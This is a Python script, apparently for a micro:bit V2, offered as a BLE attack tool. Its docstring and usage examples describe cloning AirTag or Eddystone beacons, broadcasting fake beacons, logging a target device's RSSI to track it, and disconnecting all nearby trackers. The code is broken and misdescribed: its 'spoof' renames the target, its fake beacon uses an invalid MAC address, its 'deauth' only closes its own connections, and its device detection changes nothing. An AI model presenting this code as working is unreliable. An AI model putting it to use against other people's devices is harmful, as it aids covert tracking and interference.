# microbit_ble_beacon_spoof.py

"""
BLE Beacon Spoofing + Tracking for micro:bit V2 (Multi-Device Support)

This script allows for BLE beacon spoofing, tracking, and evasion techniques.
- Detects available micro:bit devices and distributes tasks dynamically
- Spoofs real BLE beacons (AirTags, Eddystone, etc.) (`--spoof <mac> <name>`)
- Deploys fake BLE beacons (`--fake <name>`)
- Tracks BLE beacons and logs RSSI movements (`--track <mac>`)
- De-authenticates tracking BLE devices (`--deauth-all`)
- Runs all tasks sequentially if only one device is available

### Usage Examples:

1. Clone a BLE beacon:
   ```sh
   python microbit_ble_beacon_spoof.py --spoof AA:BB:CC:DD:EE:FF my_spoofed_beacon
   ```

2. Deploy a fake BLE beacon:
   ```sh
   python microbit_ble_beacon_spoof.py --fake decoy_beacon
   ```

3. Track a BLE beacon:
   ```sh
   python microbit_ble_beacon_spoof.py --track AA:BB:CC:DD:EE:FF
   ```

4. De-authenticate all tracking beacons:
   ```sh
   python microbit_ble_beacon_spoof.py --deauth-all
   ```

Requirements:
- Micro:bit V2
- Python 3.x
- bleak library (`pip install bleak`)
"""

import asyncio
from bleak import BleakScanner, BleakClient
import argparse
import json

# Detect Connected Micro:bit Devices
async def detect_microbits():
    """Scans for connected micro:bit devices and returns their count."""
    devices = await BleakScanner.discover()
    microbits = [device.address for device in devices if "micro:bit" in (device.name or "").lower()]
    print(f"[+] Detected {len(microbits)} micro:bit devices.")
    return microbits

# Spoof a BLE Beacon
async def ble_spoof(target_mac, beacon_name):
    """Clones an existing BLE beacon and rebroadcasts it."""
    print(f"[+] Spoofing BLE beacon {target_mac} as {beacon_name}...")
    async with BleakClient(target_mac) as client:
        await client.write_gatt_char("00002a00-0000-1000-8000-00805f9b34fb", beacon_name.encode())
    print("[+] Spoofed beacon successfully!")

# Deploy a Fake BLE Beacon
async def ble_fake(beacon_name):
    """Deploys a completely fake BLE beacon."""
    print(f"[+] Deploying fake BLE beacon: {beacon_name}...")
    async with BleakClient("FA:KE:BE:AC:00:00") as client:
        await client.write_gatt_char("00002a00-0000-1000-8000-00805f9b34fb", beacon_name.encode())
    print("[+] Fake beacon deployed!")

# Track a BLE Beacon
async def ble_track(target_mac):
    """Tracks BLE beacons and logs RSSI movements."""
    print(f"[+] Tracking BLE beacon {target_mac}...")
    tracking_data = []
    
    while True:
        devices = await BleakScanner.discover()
        for device in devices:
            if device.address == target_mac:
                print(f"[+] Tracking {target_mac}: RSSI {device.rssi}")
                tracking_data.append({"address": target_mac, "rssi": device.rssi})
        await asyncio.sleep(5)

# De-authenticate Tracking Beacons
async def ble_deauth_all():
    """Disables all nearby BLE beacons by disconnecting them."""
    print("[+] De-authenticating all BLE tracking devices...")
    devices = await BleakScanner.discover()
    for device in devices:
        async with BleakClient(device.address) as client:
            await client.disconnect()
            print(f"[+] Disconnected {device.address}")
    print("[+] All BLE tracking devices de-authenticated.")

# Argument Parser
if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="BLE Beacon Spoofing + Tracking for micro:bit V2")
    parser.add_argument("--spoof", nargs=2, metavar=("target_mac", "beacon_name"), help="Clone a BLE beacon")
    parser.add_argument("--fake", help="Deploy a fake BLE beacon", metavar="beacon_name")
    parser.add_argument("--track", help="Track a BLE beacon", metavar="target_mac")
    parser.add_argument("--deauth-all", help="De-authenticate all BLE tracking devices", action="store_true")
    
    args = parser.parse_args()
    loop = asyncio.get_event_loop()
    
    microbits = loop.run_until_complete(detect_microbits())
    num_microbits = len(microbits)
    
    if args.spoof:
        if num_microbits >= 2:
            loop.run_until_complete(ble_spoof(args.spoof[0], args.spoof[1]))
        else:
            loop.run_until_complete(ble_spoof(args.spoof[0], args.spoof[1]))
    elif args.fake:
        loop.run_until_complete(ble_fake(args.fake))
    elif args.track:
        loop.run_until_complete(ble_track(args.track))
    elif args.deauth_all:
        loop.run_until_complete(ble_deauth_all())
